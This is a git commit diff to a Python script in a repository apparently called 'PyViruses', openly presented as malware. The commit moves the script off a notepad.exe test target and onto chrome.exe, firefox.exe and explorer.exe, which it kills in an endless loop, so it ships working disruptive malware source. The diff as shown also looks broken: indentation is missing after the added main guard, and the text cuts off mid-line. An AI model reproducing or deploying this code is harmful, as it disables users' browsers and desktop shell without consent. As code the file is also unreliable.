24d89cfd1a8322172120e8a12a188f2d6140ab30
zeugirdoR sixelA <44281620+binexisHATT@users.noreply.github.com>
2020-10-04 22:23:59 -0400

    Update obstruct_browsing.py

--- PyViruses/BrowserObstruction/obstruct_browsing.py
+++ PyViruses/BrowserObstruction/obstruct_browsing.py
@@ -6,11 +6,14 @@ from psutil import process_iter
 from os import kill
 from signal import SIGTERM
 from time import sleep
+
+if __name__ == "__main__":
 target_browser_executables = ('chrome.exe', 'firefox.exe', 'explorer.exe')
-testing_target = ['notepad.exe']
+testing_target = ('notepad.exe')
+
 while True:
   running_processes = {p.pid: p.info['name'] for p in process_iter(["pid", "name"])}
   for pid, p_name in running_processes.items():
-    if p_name in testing_target:
+    if p_name in target_browser_executables:
       kill(pid, SIGTERM)
       sleep(10
